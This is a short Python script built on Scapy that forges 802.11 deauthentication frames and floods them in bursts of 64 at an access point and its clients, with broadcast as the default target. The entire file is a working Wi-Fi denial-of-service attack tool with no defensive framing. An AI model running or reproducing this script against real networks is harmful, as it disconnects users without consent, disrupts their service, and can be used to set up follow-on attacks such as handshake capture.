from scapy.all import Dot11, RadioTap, Dot11Deauth, Dot11Elt, Dot11Beacon, Dot11ProbeResp  # escape ide warning
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.INFO)


class Deauthentication:
    def __init__(self):
        pass

    @staticmethod
    def send(bssid, client, count):
        pckt_to_ap = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        pckt_to_client = None
        if client != 'FF:FF:FF:FF:FF:FF':
            pckt_to_client = RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
        print('Sending Deauth to ' + client + ' from ' + bssid)
        if not count:
            print('Press CTRL+C to quit')
        # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
        while count != 0:
            try:
                for i in range(64):
                    sendp(pckt_to_ap, verbose=0)  # Send deauthentication frame to the AP
                    if pckt_to_client:
                        sendp(pckt_to_client)  # Send deauthentication frame to the Client
                    os.write(1, b".")  # show sending status
                count -= 1  # If count was -1, this will be an infinite loop
                os.write(1, b"\r")  # clear one line
                time.sleep(.5)
            except KeyboardInterrupt:
                break


if __name__ == '__main__':
    Deauthentication.send('23:33:33:23:33:33', 'FF:FF:FF:FF:FF:FF', 32)
